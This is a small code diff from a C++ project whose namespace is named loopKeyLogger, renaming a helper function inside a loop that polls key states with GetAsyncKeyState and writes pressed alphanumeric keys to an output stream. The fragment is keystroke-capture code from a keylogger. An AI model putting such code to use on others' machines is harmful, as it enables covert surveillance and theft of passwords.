@@ -10,7 +10,7 @@ namespace loopKeyLogger
 			{
 				const SHORT keyState = GetAsyncKeyState(i);
 				if (keyState && (keyState ^ 1) == keyState - 1) {
-					if (utils::isKeyAlphaNum(i)) {
+					if (utils::is_alpha_num_key(i)) {
 						out << static_cast<char>(i) << std::endl;
 					}
 					else
